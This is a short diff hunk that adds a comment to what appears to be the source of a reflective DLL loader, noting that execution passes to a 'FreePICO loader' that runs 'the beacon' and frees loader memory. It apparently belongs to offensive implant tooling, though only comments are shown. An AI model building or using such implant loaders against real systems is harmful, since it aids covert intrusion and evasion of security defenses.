@@ -5,6 +5,7 @@
 
 /*
  * Removes RWX from DLL sections after loading, and applies the appropriate permissions based on the section characteristics
+ * Redirects execution to FreePICO loader which is responsible for executing the beacon and freeing the loader memory
  */
 
 /*
